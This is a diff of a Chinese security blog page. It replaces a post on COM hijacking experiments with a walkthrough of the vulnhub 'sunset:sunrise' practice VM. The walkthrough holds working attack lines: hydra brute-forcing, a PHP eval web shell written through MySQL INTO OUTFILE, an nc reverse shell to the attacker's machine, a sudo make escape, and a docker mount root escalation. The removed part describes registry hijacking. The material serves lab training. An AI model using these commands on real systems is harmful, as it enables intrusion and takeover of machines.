@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>COM劫持学习 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="COM劫持学习 | 九世的博客">
+  <title>vulnhub sunset:sunrise | 九世的博客</title>
+  <meta name="keywords" content=" 靶场练习 ">
+  <meta name="description" content="vulnhub sunset:sunrise | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1234,9 +1234,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-COM劫持学习" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-vulnhub-sunset-sunrise" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">COM劫持学习</h1>
+        <h1 class="article-title">vulnhub sunset:sunrise</h1>
     
     <div class="article-meta">
         
@@ -1245,14 +1245,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color5">靶场练习</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-06-22 01:46:01">2019-06-21 23:34</time>
+        创建时间:<time class="date" title="更新时间: 2020-01-02 14:36:12">2020-01-02 13:46</time>
         
     </div>
     <div class="article-meta">
@@ -1274,7 +1274,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#COM组件的来源"><span class="toc-text">COM组件的来源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#COM组件的方法"><span class="toc-text">COM组件的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#COM组件的规则"><span class="toc-text">COM组件的规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#环境准备"><span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实验"><span class="toc-text">实验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用应用程序快捷方式来劫持DXPServer-exe"><span class="toc-text">使用应用程序快捷方式来劫持DXPServer.exe</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#用到的方法"><span class="toc-text">用到的方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过程"><span class="toc-text">过程</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1289,46 +1289,43 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=35848041&auto=1&height=66"></iframe></p>
-<h3 id="COM组件的来源"><a href="#COM组件的来源" class="headerlink" title="COM组件的来源"></a>COM组件的来源</h3><p>COM component（COM组件）是微软公司为了计算机工业的软件生产更加符合人类的行为方式开发的一种新的软件开发技术。在COM构架下，人们可以开发出各种各样的功能专一的组件，然后将它们按照需要组合起来，构成复杂的应用系统。由此带来的好处是多方面的：可以将系统中的组件用新的替换掉，以便随时进行系统的升级和定制；可以在多个应用系统中重复利用同一个组件；可以方便的将应用系统扩展到网络环境下；COM与语言，平台无关的特性使所有的程序员均可充分发挥自己的才智与专长编写组件模块。</p>
-<h3 id="COM组件的方法"><a href="#COM组件的方法" class="headerlink" title="COM组件的方法"></a>COM组件的方法</h3><p>COM是开发软件组件的一种方法。组件实际上是一些小的二进制可执行程序，它们可以给应用程序，操作系统以及其他组件提供服务。开发自定义的COM组件就如同开发动态的，面向对象的API。</p>
-<h3 id="COM组件的规则"><a href="#COM组件的规则" class="headerlink" title="COM组件的规则"></a>COM组件的规则</h3><pre><code>COM组件是以WIN32动态链接库（DLL）或可执行文件（EXE）形式发布的可执行代码组成。
-COM组件是遵循COM规范编写的
-COM组件是一些小的二进制可执行文件
-COM组件可以给应用程序、操作系统以及其他组件提供服务
-自定义的COM组件可以在运行时刻同其他组件连接起来构成某个应用程序
-COM组件可以动态的插入或卸出应用
-COM组件必须是动态链接的
-COM组件必须隐藏（封装）其内部实现细节
-COM组件必须将其实现的语言隐藏
-COM组件必须以二进制的形式发布
-COM组件必须可以在不妨碍已有用户的情况下被升级
-COM组件可以透明的在网络上被重新分配位置
-COM组件按照一种标准的方式来宣布它们的存在
-</code></pre><p><b>在开送之前先感谢@WBG老哥帮我编辑好的OleView.NET<br>以及一些前辈们的文章：</b><br><a href="https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/" target="_blank" rel="noopener">Lateral Movement via DCOM: Round 2 | enigma0x3</a><br><a href="https://etherdream.github.io/jsproxy/-----https://labs.nettitude.com/blog/com-and-the-powerthief/" target="_blank" rel="noopener">com-and-powerhief</a></p>
-<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><pre><code>OS:windows 7
-exe:Registry,OleView.NET
-</code></pre><p>Registry下载地址：<br><a href="https://www.lanzous.com/i1vym3g" target="_blank" rel="noopener">Registry</a> 密码：black<br><a href="https://github.com/tyranid/oleviewdotnet" target="_blank" rel="noopener">GitHub - tyranid/oleviewdotnet: A .net OLE/COM viewer and inspector to merge functionality of OleView and Test Container</a></p>
-<h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>首先打开Oleview.NET，点击Registry-&gt;APPID （可以看到很多ID）<br><img src="https://s2.ax1x.com/2019/06/21/Zp9E11.md.png" alt="Zp9E11.md.png"></p>
-<p>根据上述的第一篇文章所说的操作，寻找程序启动权限为空的ID，点击：Mode-&gt;Complex，然后配置过滤规则<br><img src="https://s2.ax1x.com/2019/06/21/Zp9mnK.md.png" alt="Zp9mnK.md.png"></p>
-<p>后面我随手点开了一个ID<br><img src="https://s2.ax1x.com/2019/06/21/Zp9QtH.md.png" alt="Zp9QtH.md.png"></p>
-<p>查看一手 （设备启动权限为空）<br><img src="https://s2.ax1x.com/2019/06/21/Zp981I.png" alt="Zp981I.png"></p>
-<p>PS：看下图解释<br><img src="https://s2.ax1x.com/2019/06/21/Zp9Gct.md.png" alt="Zp9Gct.md.png"></p>
-<p>查看CLSID<br><img src="https://s2.ax1x.com/2019/06/21/Zp9NB8.md.png" alt="Zp9NB8.md.png"></p>
-<p>使用Registry定位到CLSID<br><img src="https://s2.ax1x.com/2019/06/21/Zp9scq.md.png" alt="Zp9scq.md.png"></p>
-<p>修改掉这个加载的exe就能完成劫持？（360主体防御拦截警告）<br><img src="https://s2.ax1x.com/2019/06/21/Zp9qHO.md.png" alt="Zp9qHO.md.png"></p>
-<p>根据文章中使用powershell查看COM中可用的操作<br><img src="https://s2.ax1x.com/2019/06/22/ZpFBZV.png" alt="ZpFBZV.png"></p>
-<p>经过搜索发现此COM为自定义COM，无法进行利用<br><img src="https://s2.ax1x.com/2019/06/22/ZpFRMR.md.png" alt="ZpFRMR.md.png"></p>
-<p>常见的COM劫持手法有：</p>
-<pre><code>增加缺少的CLSID进行利用 --- 失败
-修改原有CLSID加载的程序 --- 失败
-替换掉CLSID下加载路径的程序 --- 失败
-</code></pre><p>果然，还是没成功。。。。不过起码学到怎么操作了，如果想复现上述文章作者的操作的话，可以自己试试。COM劫持横向发展也是牛逼…</p>
-<h3 id="使用应用程序快捷方式来劫持DXPServer-exe"><a href="#使用应用程序快捷方式来劫持DXPServer-exe" class="headerlink" title="使用应用程序快捷方式来劫持DXPServer.exe"></a>使用应用程序快捷方式来劫持DXPServer.exe</h3><p><img src="https://s2.ax1x.com/2019/06/22/ZpkALq.md.png" alt="ZpkALq.md.png"><br>添加注册表<br><img src="https://s2.ax1x.com/2019/06/22/ZpkGex.png" alt="ZpkGex.png"></p>
-<p>再次运行，弹出calc<br><img src="https://s2.ax1x.com/2019/06/22/Zpkafe.png" alt="Zpkafe.png"></p>
-<p>我发现：</p>
-<pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths
-</code></pre><p>这个注册表的路径和镜像劫持的功能一样，但是不会被杀软拦截</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>是时候水篇博客了，打开vulnhub。找个靶机练练手- -<br><img src="https://s2.ax1x.com/2020/01/02/lY6ng0.png" alt="lY6ng0.png"></p>
+<h2 id="用到的方法"><a href="#用到的方法" class="headerlink" title="用到的方法"></a>用到的方法</h2><ul>
+<li>nmap scan port</li>
+<li>hydra爆破</li>
+<li>mysql into outfile写shell</li>
+<li>sudo -l提权</li>
+</ul>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><pre><code>fping -ag 192.168.241.0/24 &gt; zz.txt
+</code></pre><p><img src="https://s2.ax1x.com/2020/01/02/lY6c8I.png" alt="lY6c8I.png"></p>
+<p>确定靶机ip为192.168.241.169</p>
+<pre><code>nmap -Pn -sV 192.168.241.169
+</code></pre><p><img src="https://s2.ax1x.com/2020/01/02/lY67Ps.png" alt="lY67Ps.png"></p>
+<p>80打开Apache默认页面<br><img src="https://s2.ax1x.com/2020/01/02/lYcixx.png" alt="lYcixx.png"></p>
+<p>8080显示了几个路径（test.php是我的shell）<br><img src="https://s2.ax1x.com/2020/01/02/lYc2FJ.png" alt="lYc2FJ.png"></p>
+<p>图片全部脱下来binwalk没啥特殊的全部删了<br><img src="https://s2.ax1x.com/2020/01/02/lYcvlt.md.png" alt="lYcvlt.md.png"></p>
+<p>其他路径<br><img src="https://s2.ax1x.com/2020/01/02/lYgpm8.png" alt="lYgpm8.png"></p>
+<p>dirb跑了没结果<br><img src="https://s2.ax1x.com/2020/01/02/lYgltJ.png" alt="lYgltJ.png"></p>
+<p>hydra爆破ftp、爆破mysql。结果mysql爆破成功了<br><img src="https://s2.ax1x.com/2020/01/02/lYgjN4.png" alt="lYgjN4.png"></p>
+<p>mysql连上，先翻了一波数据库啥都没有<br><img src="https://s2.ax1x.com/2020/01/02/lY2V4H.png" alt="lY2V4H.png"></p>
+<p>页面提示了web路径为/var/tmp，那就写shell吧<br><img src="https://s2.ax1x.com/2020/01/02/lY2N2n.png" alt="lY2N2n.png"></p>
+<pre><code>select &#39;&lt;?php @eval($_POST[a]);?&gt;&#39; into outfile &#39;/var/tmp/test.php&#39;;
+</code></pre><p><img src="https://s2.ax1x.com/2020/01/02/lYRedU.md.png" alt="lYRedU.md.png"></p>
+<p>菜刀发现连不上..直接chrome的hakbar搞算了<br><img src="https://s2.ax1x.com/2020/01/02/lYRUFe.png" alt="lYRUFe.png"></p>
+<p>先到home目录里走一手，把user.txt拿了<br><img src="https://s2.ax1x.com/2020/01/02/lYRLY4.png" alt="lYRLY4.png"></p>
+<p><img src="https://s2.ax1x.com/2020/01/02/lYWCTO.png" alt="lYWCTO.png"></p>
+<p>反弹shell</p>
+<pre><code>nc -e /bin/bash 192.168.241.168 4444
+</code></pre><p><img src="https://s2.ax1x.com/2020/01/02/lYWltg.png" alt="lYWltg.png"></p>
+<p>sudo -l一波<br><img src="https://s2.ax1x.com/2020/01/02/lYWUBV.png" alt="lYWUBV.png"></p>
+<p>切换到dusk用户</p>
+<pre><code>COMMAND=&#39;/bin/sh&#39;
+sudo -u dusk  make -s --eval=$&#39;x:\n\t-&#39;&quot;$COMMAND&quot;
+</code></pre><p>（这个nc发神经）<br><img src="https://s2.ax1x.com/2020/01/02/lYhqk8.png" alt="lYhqk8.png"></p>
+<p>内核版本没法用exp，ps -elf | grep root找了一波root的服务<br><img src="https://s2.ax1x.com/2020/01/02/lY489e.md.png" alt="lY489e.md.png"></p>
+<p>发现docker在运行，直接提取即可</p>
+<pre><code>docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+</code></pre><p><img src="https://s2.ax1x.com/2020/01/02/lY4LHx.png" alt="lY4LHx.png"></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1338,12 +1335,12 @@ exe:Registry,OleView.NET
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>COM劫持学习</p>
+    <p><span class="copy-title">文章标题:</span>vulnhub sunset:sunrise</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-06-21, 23:34:31</p>
-    <p><span class="copy-title">最后更新:</span>2019-06-22, 01:46:01</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/7dc498ec.html" title="COM劫持学习">http://422926799.github.io/posts/7dc498ec.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-01-02, 13:46:34</p>
+    <p><span class="copy-title">最后更新:</span>2020-01-02, 14:36:12</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/c71a0647.html" title="vulnhub sunset:sunrise">http://422926799.github.io/posts/c71a0647.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
